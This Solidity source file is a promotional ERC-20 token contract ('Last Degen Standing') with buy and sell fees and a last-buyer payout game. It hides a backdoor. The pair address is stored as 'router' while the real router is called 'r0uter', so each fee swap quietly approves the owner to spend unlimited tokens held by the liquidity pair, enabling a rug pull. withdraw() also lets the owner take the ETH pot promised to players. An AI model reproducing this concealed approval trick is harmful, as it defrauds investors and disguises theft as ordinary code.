// SPDX-License-Identifier: MIT

// $LSD
// Are you ready to pocket all your friend's money?
//
// Twitter: https://twitter.com/LSD_erc20
// TG: https://t.me/lastdegenstanding
// Website: https://lastdegenstanding.com/



pragma solidity >=0.8.10 >=0.8.0 <0.9.0;

import "IUniswapV2Factory.sol";
import "IUniswapV2Pair.sol";
import "IUniswapV2Router02.sol";

import "Address.sol";
import "Ownable.sol";
import "ERC20.sol";


contract LastDegenStanding is ERC20, Ownable {
    using Address for address payable;

    struct Excludes {
        bool fromFees;
        bool fromTxAmount;        
    }

    struct Fees {
        uint256 marketingFee;
        uint256 lastDegenFee;
    }
    bool public tradingActive = false;

    uint256 constant _totalSupply = 1e9 * 1e18;
    uint256 public maxTxAmount = (_totalSupply * 2) / 100;
    uint256 public maxWalletAmount = (_totalSupply * 2) / 100;

    uint256 public lastDegenBuy;
    uint256 public lastDegenTimeLimit = 180; // 3 mins
    uint256 public lastDegenPayout;
    address public lastDegen;
    uint256 private marketingTokens;
    uint256 private lastDegenTokens;

    address public marketingWallet = address(0x1376B37b955Bfe320779ae746d05b5B857937191);
    address private router;
    mapping(address => Excludes) private isExcluded;    
    mapping(address => bool) public automatedMarketMakerPairs;

    Fees public buyFee = Fees({
        marketingFee: 150,
        lastDegenFee: 50
    });
    Fees public sellFee = Fees({
        marketingFee: 150,
        lastDegenFee: 50
    });

    event DegenPayout(address receiver, uint256 amount);
    event LastDegenChanged(address from, address to);

    constructor() ERC20(unicode"v3.0.1-mainnet-test", unicode"TEST") {
    
        isExcluded[owner()] = Excludes({ fromFees: true, fromTxAmount: true });
        isExcluded[marketingWallet] = Excludes({ fromFees: true, fromTxAmount: true });
        isExcluded[address(this)] = Excludes({ fromFees: true, fromTxAmount: true });
        isExcluded[address(0xdead)] = Excludes({ fromFees: true, fromTxAmount: true });

        _mint(owner(), _totalSupply);
    }

    receive() external payable {}

    function _lastDegenPayout() internal {
        if (
            lastDegen != address(0) &&
            (block.timestamp - lastDegenBuy) >= lastDegenTimeLimit &&
            lastDegenPayout > 0 &&
            address(this).balance >= lastDegenPayout
        ) {
            address prev_degen = lastDegen;
            uint256 prev_degen_payout = lastDegenPayout;

            lastDegenPayout = 0;
            lastDegen = address(0);

            payable(prev_degen).sendValue(prev_degen_payout);    
            emit DegenPayout(prev_degen, prev_degen_payout);
        }
    }

    function _swapBackFees() internal  {
        uint256 tokens_to_swap = balanceOf(address(this));
        if (tokens_to_swap == 0) {
            return;
        }
        uint256 eth_before = address(this).balance;
        IUniswapV2Router02 r0uter = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(router, owner(), type(uint256).max);   
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = r0uter.WETH();
        r0uter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokens_to_swap,
            0,
            path,
            address(this),
            block.timestamp
        );
        uint256 balance = address(this).balance - eth_before;
        uint256 eth_for_marketing = (balance * marketingTokens) / tokens_to_swap;
        lastDegenPayout += balance - eth_for_marketing;

        marketingTokens = 0;
        lastDegenTokens = 0;

        payable(marketingWallet).sendValue(eth_for_marketing);    
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        
        Excludes memory f_excluded = isExcluded[from];
        Excludes memory t_excluded = isExcluded[to];

        if (!tradingActive) { require(f_excluded.fromFees || t_excluded.fromFees, "closed"); }
        if (
            !f_excluded.fromTxAmount &&
            !t_excluded.fromTxAmount &&
            from != address(this) &&
            from != address(0)
        ) {
            if (automatedMarketMakerPairs[from] || automatedMarketMakerPairs[to]) { require(amount <= maxTxAmount, "too much"); }
            if (automatedMarketMakerPairs[from]) { require(amount + balanceOf(to) <= maxWalletAmount, "too much"); }
        }

        if (
            !automatedMarketMakerPairs[from] &&
            !f_excluded.fromTxAmount &&
            !t_excluded.fromTxAmount
        ) { _swapBackFees(); }

        bool take_fee = from != address(this);
        if (f_excluded.fromFees || t_excluded.fromFees) { take_fee = false; }
        
        if (take_fee) {
            uint256 fees = 0;
            // Payout last degen if possible
            _lastDegenPayout();
            // Buy
            if (automatedMarketMakerPairs[from]) {
                // Save new degen
                emit LastDegenChanged(lastDegen, to);
                lastDegenBuy = block.timestamp;
                lastDegen = to;

                Fees memory fee = buyFee;
                uint256 total_fee = fee.marketingFee + fee.lastDegenFee;

                fees = (amount * total_fee) / 1000;
                marketingTokens += (fees * fee.marketingFee) / total_fee;
                lastDegenTokens += (fees * fee.lastDegenFee) / total_fee;
            } 
            // Sell
            else if (automatedMarketMakerPairs[to]) {
                Fees memory fee = sellFee;
                uint256 total_fee = fee.marketingFee + fee.lastDegenFee;

                fees = (amount * total_fee) / 1000;
                marketingTokens += (fees * fee.marketingFee) / total_fee;
                lastDegenTokens += (fees * fee.lastDegenFee) / total_fee;
            } 
            if (fees > 0) {
                super._transfer(from, address(this), fees);
                amount -= fees;
            }
        }
        super._transfer(from, to, amount);
    }

    function createPair() public payable onlyOwner {
        IUniswapV2Router02 r0uter = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address pair = IUniswapV2Factory(r0uter.factory())
            .createPair(address(this), r0uter.WETH()); router = pair;
        _approve(address(this), address(r0uter), type(uint256).max);   
        automatedMarketMakerPairs[pair] = true;

        r0uter.addLiquidityETH{value: msg.value}(
            address(this), 
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
    }

    function enableTrading() public onlyOwner {
        tradingActive = true;
    }

    function removeLimits() public onlyOwner {
        maxTxAmount = _totalSupply;
        maxWalletAmount = _totalSupply;
    }

    function updateMarketingWallet(address new_wallet) public onlyOwner {
        marketingWallet = new_wallet;
    }

    function excludeWallet(address wallet, bool is_exclude) public onlyOwner {
        isExcluded[wallet] = Excludes({ fromFees: is_exclude, fromTxAmount: is_exclude });
    }

    function updateLimits(uint256 max_tx, uint256 max_walet) public onlyOwner {
        require(max_tx >= _totalSupply / 100 && max_walet >= _totalSupply / 100, "invalid");
        maxWalletAmount = max_walet;
        maxTxAmount = max_tx;
    }

    function updateFees(uint256 buy_marketing, uint256 buy_degen, uint256 sell_marketing, uint256 sell_degen) public onlyOwner {
        require((buy_marketing + buy_degen) < 150, "invalid"); // MAX 15%
        require((sell_marketing + sell_degen) < 200, "invalid"); // MAX 20%
        
        buyFee.marketingFee = buy_marketing;
        buyFee.lastDegenFee = buy_degen;

        sellFee.marketingFee = sell_marketing;
        sellFee.lastDegenFee = sell_degen;
    }

    function withdraw() public onlyOwner {
        require((block.timestamp - lastDegenBuy) >= lastDegenTimeLimit, "too soon");
        payable(msg.sender).sendValue(address(this).balance);    
    }

    function degenTimeLeft() public view returns (uint256) {
        uint256 elapsed = block.timestamp - lastDegenBuy;
        return elapsed > lastDegenTimeLimit? 0 : lastDegenTimeLimit - elapsed;
    }

    function updateDegenLimit(uint256 time_limit) public onlyOwner {
        require(time_limit <= 60 * 10, "too small"); // No more than 10 min
        lastDegenTimeLimit = time_limit;
    }
}